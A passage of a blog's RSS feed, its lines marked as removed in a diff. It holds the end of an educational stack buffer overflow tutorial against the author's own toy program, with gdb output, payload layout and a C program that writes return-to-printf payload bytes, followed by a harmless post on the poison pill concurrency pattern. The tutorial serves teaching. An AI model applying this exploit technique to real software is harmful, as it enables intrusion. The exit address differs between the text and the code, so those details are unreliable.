-&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ echo &quot;a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence&quot; | ./basic
-Hi, I&#39;m server.
-you entered: a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence
-Segmentation fault (core dumped)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The problem is the input is too long so that it override some part of original stack. This could be a disaster since stack is used to keep important variable value.&lt;/p&gt;
-
-&lt;p&gt;And this is why this kind of attack is called Buffer Overflow Attack.&lt;/p&gt;
-
-&lt;h2 id=&quot;to-do-a-real-attack&quot;&gt;To do a real attack&lt;/h2&gt;
-
-&lt;p&gt;To do a real attack, i.e. let the program do something you intend it to do, rather than just crash, we need more work and more analysis.&lt;/p&gt;
-
-&lt;h4 id=&quot;analysis&quot;&gt;&lt;strong&gt;Analysis&lt;/strong&gt;&lt;/h4&gt;
-
-&lt;p&gt;By using &lt;code&gt;gdb&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;(gdb) b *0x804849c
-Breakpoint 1 at 0x804849c
-(gdb) r
-Starting program: basic 
-Hi, I&#39;m server.
-
-Breakpoint 1, 0x0804849c in main ()
-(gdb) i r esp
-esp            0xffffd210       0xffffd210
-(gdb) x/wx 0xffffd210
-0xffffd210:     0xffffd220
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;we could find right before &lt;code&gt;gets&lt;/code&gt;  is called, &lt;code&gt;esp&lt;/code&gt; is pointing to &lt;code&gt;0xffffd220&lt;/code&gt;, which means our input message will be written to this address. &lt;br /&gt;
-Also, if we set breakpoint at beginning of &lt;code&gt;main&lt;/code&gt; function,&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;(gdb) b *0x0x8048480
-Breakpoint 2 at 0x8048480
-(gdb) r
-Starting program: basic
-Breakpoint 2, 0x08048480 in main ()
-(gdb) i r esp
-esp            0xffffd23c       0xffffd23c
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;we could find return address for &lt;code&gt;main&lt;/code&gt; function is saved at  &lt;code&gt;0xffffd23c&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Did you find the secret? The offset between the return address and the address we are going to write is only &lt;code&gt;0xffffd23c - 0xffffd220 = 0x1C = 28&lt;/code&gt;. This means if our input message is 28 characters or more, then we could overwrite the return address of &lt;code&gt;main&lt;/code&gt; function!&lt;/p&gt;
-
-&lt;p&gt;And let’s remind what return instruction does. It puts the value pointed by &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt;,  increment &lt;code&gt;esp&lt;/code&gt; by 4 bytes, and execute the code pointed by &lt;code&gt;eip&lt;/code&gt;. So this means if we change the value of return address, we could let program go to some surprised place and execute some surprised code!&lt;/p&gt;
-
-&lt;p&gt;Moreover, if we construct our input message using executable code and let the return address go to our code, then we could let program do whatever we want! And this closes our analysis! Bravo!&lt;/p&gt;
-
-&lt;h4 id=&quot;sum-up&quot;&gt;&lt;strong&gt;Sum up&lt;/strong&gt;&lt;/h4&gt;
-&lt;p&gt;Let’s put the pieces together. To do a basic buffer overflow attack, we need to…&lt;br /&gt;
-1.Find the address where your input message is going to write.&lt;br /&gt;
-2.Find the most recent return address that is larger than the address in point 1.&lt;br /&gt;
-3.Carefully calculate the offset of these two addresses and design your input message so that they could be executed by CPU to do some surprisingly fun job.&lt;/p&gt;
-
-&lt;h4 id=&quot;lets-hack-our-not-so-robust-program&quot;&gt;&lt;strong&gt;Let’s Hack Our ‘Not-so-Robust’ Program&lt;/strong&gt;&lt;/h4&gt;
-&lt;p&gt;The normal execution of &lt;code&gt;basic&lt;/code&gt; program is prompt exactly same thing as we input. Now we would like it to print &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in a funny way.&lt;/p&gt;
-
-&lt;p&gt;To print something, we still need the built-in &lt;code&gt;print&lt;/code&gt; function in &lt;code&gt;stdlib&lt;/code&gt;. Take a look at assembly code again,&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;printf
-$2 = (&amp;lt;data variable, no debug info&amp;gt; *) 0xf7e32f60 &amp;lt;printf&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;To print something, we need to make sure &lt;code&gt;esp&lt;/code&gt; is pointing to what we want to print (i.e. &lt;code&gt;I&#39;m hacked!&lt;/code&gt; in this case), and then call &lt;code&gt;printf&lt;/code&gt; function! The input message should be like this:&lt;br /&gt;
-[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message]&lt;/p&gt;
-
-&lt;p&gt;To call the &lt;code&gt;printf&lt;/code&gt; function is easy, we just need to overwrite the return address in &lt;code&gt;main&lt;/code&gt; function with &lt;code&gt;printf&lt;/code&gt; address, which we’ve already figured out as  &lt;code&gt;0xf7e32f60&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Then where is the hacking message? Remember the &lt;code&gt;printf&lt;/code&gt; function print message out until it find a &lt;code&gt;null&lt;/code&gt; terminator. Therefore we could not put the hacking message at front of input message and followed by the padding, since in this way we would print rubbish that we don’t want to. So we have to put them at the end of input message. Thus, the input message should be like this:&lt;br /&gt;
-[several padding to return address] – [address to &lt;code&gt;printf&lt;/code&gt;] – [pointer to hacking message] – [hacking message]&lt;/p&gt;
-
-&lt;p&gt;One last thing, we need some padding at after return to &lt;code&gt;printf&lt;/code&gt;, this is because we use &lt;code&gt;printf&lt;/code&gt; function not by “call” but by “return”. As we analyzed before, just before call &lt;code&gt;printf&lt;/code&gt;, we make sure &lt;code&gt;esp&lt;/code&gt; pointing to message we want to print out. But when we use “return” to call a function, it first put &lt;code&gt;esp&lt;/code&gt; to &lt;code&gt;eip&lt;/code&gt; and then pop &lt;code&gt;esp&lt;/code&gt; so that &lt;code&gt;esp&lt;/code&gt; will move up by 4 bytes. Also, the value in this padding is the return address after return from &lt;code&gt;printf&lt;/code&gt;, i.e. the program will try to execute code at the position of this padding value. So we could put an &lt;code&gt;exit&lt;/code&gt; here to let the program stop.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;(gdb) p &amp;amp;exit
-$5 = (&amp;lt;text variable, no debug info&amp;gt; *) 0xf7e17b10 &amp;lt;exit&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Okay! Let’s hack it!&lt;br /&gt;
-We know…&lt;br /&gt;
-1. The address we are going to write from is: &lt;code&gt;0xffffd220&lt;/code&gt;&lt;br /&gt;
-2. The original return address is at: &lt;code&gt;0xffffd23c&lt;/code&gt;&lt;br /&gt;
-3. The return address need to overwrite as &lt;code&gt;0xf7e32f60&lt;/code&gt;&lt;br /&gt;
-4. The exit address is &lt;code&gt;0xf7e17b10&lt;/code&gt;&lt;br /&gt;
-5. And we put hacking message at the end: &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;So, what we need is:&lt;br /&gt;
-&lt;code&gt;0xffffd220&lt;/code&gt; : 28 &lt;code&gt;\x90&lt;/code&gt; as padding&lt;br /&gt;
-……&lt;br /&gt;
-&lt;code&gt;0xffffd23c&lt;/code&gt; : &lt;code&gt;0xf7e32f60&lt;/code&gt; address to call &lt;code&gt;printf&lt;/code&gt;&lt;br /&gt;
-&lt;code&gt;0xffffd240&lt;/code&gt; : &lt;code&gt;0xf7e17b10&lt;/code&gt; address to exit, also as padding&lt;br /&gt;
-&lt;code&gt;0xffffd244&lt;/code&gt; : &lt;code&gt;0xffffd248&lt;/code&gt; pointer to printing message&lt;br /&gt;
-&lt;code&gt;0xffffd248&lt;/code&gt; : &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Another important thing we need to keep in mind is, our system is generally small-endian. This means instead of &lt;code&gt;0xf7e32f60&lt;/code&gt; as is human readable, we need to put &lt;code&gt;0x602fe3f7&lt;/code&gt; in our input message. The same thing holds to &lt;code&gt;0xffffd248&lt;/code&gt; and &lt;code&gt;0xf7e17b10&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;So, based on all these analysis. We get our input message:&lt;br /&gt;
-28 &lt;code&gt;\x90&lt;/code&gt;  &lt;code&gt;0x602fe3f7&lt;/code&gt; &lt;code&gt;0x107be1f7&lt;/code&gt; &lt;code&gt;0x48d2ffff&lt;/code&gt; &lt;code&gt;I&#39;m hacked!&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;To generate the text we could have a helper program &lt;code&gt;hack&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* basic hack.c */
-#include &amp;lt;stdio.h&amp;gt;
-
-int main(int argc, char** argv)
-{
-        int i = 0;
-        //padding
-        for(i = 0; i &amp;lt; 28; i++)
-        {
-                printf(&quot;\x90&quot;);
-        }
-        printf(&quot;\x60\x2f\xe3\xf7&quot;);//address to printf
-        printf(&quot;\xa1\x83\x04\x08&quot;);//address to exit
-        printf(&quot;\x48\xd2\xff\xff&quot;);//address to print message
-        printf(&quot;I&#39;m Hacked!\n&quot;);
-
-        return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then compile it and save to a file &lt;code&gt;hack.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;-bash-4.2$ gcc -o hack hack.c                                                                                      
--bash-4.2$ ./hack &amp;gt; hack.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Finally use &lt;code&gt;gdb&lt;/code&gt; to test it!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;(gdb) r &amp;lt; hack.txt 
-Starting program: basic &amp;lt; hack.txt
-Hi, I&#39;m server.
-you entered: ????????????????????????????`/{H?I&#39;m Hacked!
-I&#39;m Hacked![Inferior 1 (process 41057) exited with code 0111]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; At the end of output, it says program exited with code 0111. This means program doesn’t exit normally. This is because the &lt;code&gt;exit&lt;/code&gt; function also use &lt;code&gt;esp&lt;/code&gt; as exit code, but in our program &lt;code&gt;esp&lt;/code&gt; saves address to message. To overcome this problem, we need to use ROP(Return-Oriented-Programming) technique. See following posts!&lt;/p&gt;
-
-&lt;p&gt;Last but not least. If you test this attack without &lt;code&gt;gdb&lt;/code&gt;, you’ll get&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;-bash-4.2$ ./basic &amp;lt; hack.txt 
-Hi, I&#39;m server.
-you entered: ????????????????????????????`/{H?I&#39;m Hacked!
-Segmentation fault (core dumped)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This is because the so-called ASLR(Address Space Layout Randomization) defense technique. We’ll talk about how to overcome this defense in following posts.&lt;/p&gt;
-
-&lt;p&gt;And this ends the very basic Buffer Overflow Attack. Hope you enjoy it!&lt;/p&gt;
-</description>
-        <pubDate>Sun, 14 Feb 2016 14:38:00 -0800</pubDate>
-        <link>http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</link>
-        <guid isPermaLink="true">http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/</guid>
-        
-        <category>Buffer Overflow</category>
-        
-        <category>Secure</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Poison Pill Pattern</title>
-        <description>&lt;h1 id=&quot;poison-pill-pattern&quot;&gt;Poison Pill Pattern&lt;/h1&gt;
-
-&lt;h3 id=&quot;why-need-this&quot;&gt;Why need this?&lt;/h3&gt;
-&lt;p&gt;In a producer consumer problem, how could threads know when to stop? If just interrupt all threads abruptly, maybe some jobs in the queue are not handled properly. So we want to find a way to tell all threads that you should stop, and stop decently.&lt;/p&gt;
-
-&lt;h3 id=&quot;how-it-works&quot;&gt;How it works?&lt;/h3&gt;
-&lt;p&gt;The idea is extremely simple. When producer wants to stop the service, it sends a special message (poison pill) into the queue and stops it self, when consumer gets this message, it closes it self as well.&lt;/p&gt;
-
-&lt;h3 id=&quot;what-if-multiply-producers-and-multiply-consumers&quot;&gt;What if multiply producers and multiply consumers?&lt;/h3&gt;
-&lt;ol&gt;
-  &lt;li&gt;If only one producer and consumer, then it’s totally fine.&lt;/li&gt;
-  &lt;li&gt;If there are several producers and one consumer, each producer could send a poison pill to consumer and stop itself. When consumer gets same number of poison pills, then it stop running.&lt;/li&gt;
-  &lt;li&gt;If there are one producer and several consumers, then producer send poison pills of same number as consumers to queue. Each consumer stops itself when get a poison pill.&lt;/li&gt;
-  &lt;li&gt;If there are multiple producers and multiple consumers, then each producer send poison pill of same number as consumers to queue. Each consumer stops itself when get poison pills of same number as producer.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;what-is-the-problem&quot;&gt;What is the problem?&lt;/h3&gt;
-&lt;p&gt;This solution suppose producers and consumers know the quantity of each other.&lt;br /&gt;
-Also, if we have N producers and M consumers, then number of poison pills will be N*M, which could be large.&lt;/p&gt;
-
-&lt;h3 id=&quot;alternative-solution&quot;&gt;Alternative Solution&lt;/h3&gt;
-&lt;p&gt;One alternative solution is we relax the constraints so that consumers could also offer messages into queue, but only when it is trying to stop the whole service.&lt;br /&gt;
-On producers’ side, when all producers are going to leave the service, the last producer send a poison pill to the queue. This could be done by several ways, one way is to elect a leader so the leader send the poison pill and then every producer leaves.&lt;br /&gt;
-On consumers’ side, when any of consumers get a poison pill, it first the poison pill back to queue and leave the service. So that all consumers will finally leave the service.&lt;br /&gt;
-This solution is based on that producers know each other, and consumers know each other, but producers and consumers don’t know each other, which makes more sense in real world.&lt;/p&gt;
-
-&lt;h3 id=&quot;reference&quot;&gt;Reference&lt;/h3&gt;
-&lt;ol&gt;
-  &lt;li&gt;“Poison Pill Shutdown” in Java Concurrency in Practice&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        <pubDate>Thu, 11 Feb 2016 14:37:00 -0800</pubDate>
-        <link>http://huangxuan.me/2016/02/11/poison-pill-pattern/</link>
-        <guid isPermaLink="true">http://huangxuan.me/2016/02/11/poison-pill-pattern/</guid>
-        
-        <category>Design Pattern</category>
-        
-        <category>Multi-thread</category>
-        
-        <category>Producer Consumer</category>
         
         
       </item>
